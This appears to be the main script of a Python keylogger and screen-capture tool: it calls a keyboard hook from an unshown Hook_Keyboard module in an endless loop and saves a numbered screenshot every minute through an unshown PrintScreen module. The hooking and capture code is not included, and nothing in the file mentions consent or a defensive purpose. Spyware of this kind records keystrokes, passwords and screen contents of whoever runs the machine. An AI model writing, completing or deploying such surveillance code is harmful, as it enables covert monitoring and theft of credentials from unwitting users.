import Hook_Keyboard
import PrintScreen
import schedule
import time


global_number = 0


def wait(number):
    PrintScreen.take_screen(number)
    global global_number
    global_number = global_number + 1


schedule.every(1).minutes.do(lambda: wait(global_number))
while True:
    Hook_Keyboard.hook_keyboard()
    schedule.run_pending()
    time.sleep(1)



